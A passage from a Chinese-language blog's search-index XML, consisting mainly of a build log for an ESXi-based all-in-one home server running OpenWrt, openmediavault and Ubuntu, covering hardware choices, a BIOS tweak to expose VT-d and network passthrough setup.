alt="kali"></p><center>Docker内的Kali无法运行nmap</center><br><p><img src="https://cdn.starryloki.com/2023/11/30b84f84b39dcde4dc2a5d46e8118987.jpg" alt="local"></p><center> 本地运行nmap</center><br><p><img src="https://cdn.starryloki.com/2023/11/29dafe01c02347c210ef7bceef3769c6.jpg" alt="x86"></p><center>运行的是x86_64的Linux</center>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 虚拟机 </tag>
            
            <tag> macOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于ESXi的All in One主机部署笔记</title>
      <link href="/2021/01/27/%E5%9F%BA%E4%BA%8EESXi%E7%9A%84All-in-One%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/01/27/%E5%9F%BA%E4%BA%8EESXi%E7%9A%84All-in-One%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笔者在学校的网络布局有许多问题，比如H3C-R365路由器功能十分少且不支持OpenWrt之类的开源系统；笔者用作NAS的树莓派I&#x2F;O性能较差（可能与系统盘是SD卡有关），在千兆局域网下上传速度最多只有30MB&#x2F;s，会直接影响大文件写入和 Time Machine 备份的效率。基于以上需求，我打算部署一台All in One主机。</p><span id="more"></span><p><img src="https://cdn.starryloki.com/2023/07/872d348a7251ff26efc4372679690f76.jpg" alt="map0.jpg"></p><center><p><font size=2>原先的布局图示</font></p></center><br><h2 id="1-底层选择"><a href="#1-底层选择" class="headerlink" title="1.底层选择"></a>1.底层选择</h2><p>All in One主机即在物理机运行虚拟机底层，然后创建多个虚拟机诸如OpenWrt，Openmediavault，ubuntu等操作系统实现不同服务，不同于别的分布式部署，这些系统都运行在同一台物理机上。采用All in One的优点有很多，比如能充分发挥一台服务器的性能，能搭建x86架构的Linux以解决M1 Mac的部分兼容性问题，易于管理等。缺点也十分明显：物理机出现故障会影响整个体系（All in Boom）。</p><p><img src="https://cdn.starryloki.com/2023/07/aeda3f2c5e9dea66636e443c5bf96c68.jpg" alt="mac.jpg"></p><center><p><font size=2>M1芯片的Mac在搭建博客的时候遇到了兼容性问题</font></p></center><br><p>当前市面上较为出名的虚拟机底层有Windows提供的HyperV，VMWare提供的ESXi以及开源的Proxmox VE。由于Windows Server系统的稳定性大大不如Linux系列，所以HyperV首先被排除。对比PVE，ESXi拥有操作简便，CPU虚拟化效率高等优点，但是后者硬件兼容性较差，仅原生支持一些服务器级别的硬件，经过多方面的考虑，笔者决定使用ESXi进行部署。</p><h2 id="2-硬件准备"><a href="#2-硬件准备" class="headerlink" title="2.硬件准备"></a>2.硬件准备</h2><p>十分巧合的是，笔者最近获得了一台其他地方淘汰下来的一台H81-ITX主板的准系统，于是准备用这台机器来部署All in One，配置如下：  </p><p>主板：SOYO-H81-ITX<br>CPU：Intel Celeron G1840 @2.8GHz<br>GPU：CPU集成显卡并预留留一条PCIe x16接口<br>内存：4GB DDR3<br>板载网卡：Realtek RTL8102E 100Mbps<br>电源：机箱内集成120W电源模块并附送60W电源适配器<br>SSD: Sandisk Z400s 128G</p><p>为了能运行更多的虚拟机，笔者直接给机器拓展了一条之前剩余的4G DDR3内存。  </p><p>要想获得好的虚拟机性能少不了硬件直通，而H81主板所支持的1150针系列处理器中只有Core Gen4的部分处理器以及Xeon E3系列支持Intel VT-d<a href="%E5%AE%9A%E5%90%91IO%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%EF%BC%8C%E7%A1%AC%E4%BB%B6%E7%9B%B4%E9%80%9A%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6">^1</a>，而其中支持超线程的CPU中，Xeon E3-1265L v3的功耗十分低（TDP&#x3D;45W），查阅天梯图可知该处理器性能与E3-1230v2持平，且带有集成显卡，是个十分不错的选择，相比之下E3-1231 v3（没有集成显卡且功耗大）和i7-4790（功耗大且价格昂贵）就逊色多了，于是笔者从淘宝以380元购入了一颗E3-1265L v3散片，以替换性能羸弱的G1840并获得VT-d支持。  </p><center><p><img src="https://cdn.starryloki.com/2023/07/d565c4148f3f78aeff9d786cf82979f6.jpg"></p><p><font size=2>被替换下来的G1840</font></p></center><br><p>网卡在All in One里面十分重要，而板载网卡不仅带宽十分感人且第三方驱动仅支持到ESXi6.0，于是笔者从闲鱼以25元购入了一块HP-331FLR服务器网卡，这个网卡搭载了博通BCM5719芯片，拥有ESXi7.0的原生支持，最重要的是，它有4个网口！虽然HP的服务器网卡不能直接插在家用主板的PCIe口上，但是可以通过转接板转成家用的PCIe x8接口，于是又从闲鱼以20元购入了一块转接板。所幸之前选择了带有集成显卡的CPU，否则网卡将因为没有多余的PCIe接口而无法安装。</p><p>而给NAS的硬盘则选择了性价比极高的西数HC320 8TB企业盘,而这个硬盘功耗为12V0.9A,是之前西数紫盘的(12V0.45A)2倍,可能需要安装一个标准电源.</p><p>从计划的布局来看，网卡的四个网口中有三个会长期占用且数据量有一定的规模，于是给网卡增加一个散热风扇是十分有必要的，正好笔者淘汰了树莓派后多出了一个迷你风扇。而风扇接入的是5v0.2A的直流电，如果从主板散热器供电口（12V）分线给小风扇的话，小风扇噪音极大且容易过载，既然是5v供电，那应该可以从主板多余的USB针脚处借电，查阅USB针脚定义可知应该要把风扇接入到GND和VCC，接入后风扇正常转动，之后使用热熔胶将风扇固定在网卡芯片的导热板上。并且为了加固网卡和PCIe接口以避免插拔网线造成松动，笔者在网卡和PCIe的接口处也封上了热熔胶。</p><p><img src="https://cdn.starryloki.com/2023/07/2b4a11e3720d224063178a166317a86d.jpg" alt="usbf.jpg"></p><center><p><font size=2>USB针脚定义</font></p></center><br><center><p><img src="https://cdn.starryloki.com/2023/07/244cf97dcf6001ba21183f5e9489002b.jpg" alt="usb.jpg"></p><p><font size=2>将风扇的正负极插在USB针脚上</font></p></center><br> <p><img src="https://cdn.starryloki.com/2023/07/afa7909470c618ba2cf889e6b6d6bd1c.jpg" alt="interface.jpg"></p><center><p><font size=2>改造完成后的网卡全景图</font></p></center><br><p>于是，笔者现在获得了一台这样的设备，之后又从电脑城低价购入了一个ITX机箱，装上标准电源及主板硬盘后，组装完成，开始安装系统。</p><p>CPU: Intel Xeon E3-1265L v3 @2.5Ghz<br>GPU: CPU集成<br>RAM: 2*4GB DDR3<br>网卡: 4*BCM5719 1000Mbps<br>主板: SOYO-H81-ITX<br>HDD: WD-HC320 8T</p><p><img src="https://cdn.starryloki.com/2023/07/8b6f7a46391a5d8c16db58295ff35e4b.jpg"></p><center><p><font size=2>改造完成后的主机</font></p></center><br><center><p><img src="https://cdn.starryloki.com/2023/07/65072d47e2e7d001270892a5114b0290.jpg"></p><p><font size=2>装入ITX机箱并从旧硬盘拷贝数据</font></p></center><br><h2 id="3-系统安装"><a href="#3-系统安装" class="headerlink" title="3.系统安装"></a>3.系统安装</h2><p>学校内网就有ESXi6.7 update2的镜像，下载十分方便，下载完成后写入到u盘，在服务器上用usb启动就能进入到ESXi安装页面。值得一提的是，如果平台不支持Intel VT-d，则需要在安装之前和进入系统之前选择命令行，输入<code>noiommu</code>，否则会在加载系统时的初始化IOV阶段卡住。  </p><p>而梅捷的H81主板BIOS将VT-d选项隐藏起来了，为了确定主板是否能开启VT-d，笔者用aptio提取BIOS镜像，再通过AMIBCP读取BIOS文件，全局搜索VT-d选项，果不其然搜索到了，于是将该选项调整为对用户可见，修改完成后刷入BIOS并进入查看，发现VT-d选项默认开启，在确认使用E3-1265L v3时VT-d Capability 显示为Supported后，放心进入ESXi安装程序。</p><p><img src="https://cdn.starryloki.com/2023/07/0e753c505c43f144b6de0acf61b5b486.jpg"></p><center><p><font size=2>需要将选项及其父目录设置为USER才能对普通用户可见</font></p></center><br><p>后续安装非常顺利，无脑下一步即可。  </p><p>系统安装完成后,打开设置查看硬件状态,网卡已经是支持直通了,于是将非管理网口的网卡全部设置为直通状态.</p><p><img src="https://cdn.starryloki.com/2023/07/ebb487755cd84132d6c96b52e8f7a95d.jpg"></p><center><font size=2>将网卡切换为直通</font></center><br><h2 id="4-应用部署"><a href="#4-应用部署" class="headerlink" title="4.应用部署"></a>4.应用部署</h2><h3 id="操作系统的选择"><a href="#操作系统的选择" class="headerlink" title="操作系统的选择"></a>操作系统的选择</h3><p>笔者曾经在树莓派上通过docker安装OpenWrt作旁路由，对OpenWrt比较熟悉，故选择Lean编译的OpenWrt x86作为软路由，这个版本集成了许多插件，UI也十分好看。</p><p>NAS的系统笔者没有选择大多数人选择的黑群晖，而选择了基于Debian10的openmediavault，这个系统功能简洁且能满足个人需求，且支持较多插件，不失为一个不错的选择。</p><p>除了上述两个核心功能，笔者还安装了Ubuntu Server 20.04 LTS，用来挂各种服务以及解决部分M1 Mac的兼容性问题。</p><h3 id="网络部署"><a href="#网络部署" class="headerlink" title="网络部署"></a>网络部署</h3><p>由于ESXi管理网口不能直通，故只直通了1个网口给OpenWrt做LAN，另外为了防止NAS数据量过大阻塞LAN口，笔者还直通了一个网口给Openmediavault以直接接入下游交换机，多余的一个网口直通给OpenWrt并且与WAN口桥接，必要时可以直接连接这个端口获得学校内网以172开头的IP地址。</p><p><img src="https://cdn.starryloki.com/2023/07/6250ec7145250626cb0c2d80ae2e42f2.jpg"></p><center><p><font size=2>新布局图示</font></p></center><br><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过测试，在仅运行OpenWrt和Openmediavault系统时，整机功耗为40W，而在ubuntu进行一些高占用的任务时，整机功耗会高达60W，使用Apple Watch测量噪音约为39db，处于可接受的水平。从MacBook通过有线连接局域网并使用SMB访问NAS，速度大致接近千兆网络的带宽，可见此时的传输瓶颈为千兆网络而非硬盘，得益于openmediavault，NAS也能通过SMB作为macOS的Time Machine备份主机。至此，All in One主机已经部署完毕。</p><center><p><img src="https://cdn.starryloki.com/2023/07/d4977494556a8f63fa67eb8a39610ce6.png" alt="noice"></p><p><font size=2>使用Apple Watch测量噪音</font></p></center><br><p><font size=2>1. VT-d：定向IO虚拟化技术，是硬件直通到虚拟机的必要条件</font></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> 硬件 </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
